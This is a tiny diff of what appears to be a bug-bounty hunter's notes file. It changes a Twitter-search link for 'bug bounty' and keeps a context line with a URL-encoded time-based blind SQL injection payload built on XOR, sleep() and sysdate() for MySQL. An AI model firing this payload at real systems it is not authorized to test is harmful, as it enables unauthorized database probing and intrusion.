@@ -1,5 +1,6 @@
 https://h1.security.nathan.sx/
-https://twstalker.com/search/bug%20bounty#nav-users
+https://twstalker.com/search/bug%20bounty#nav-tweets
+
 
 0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
 
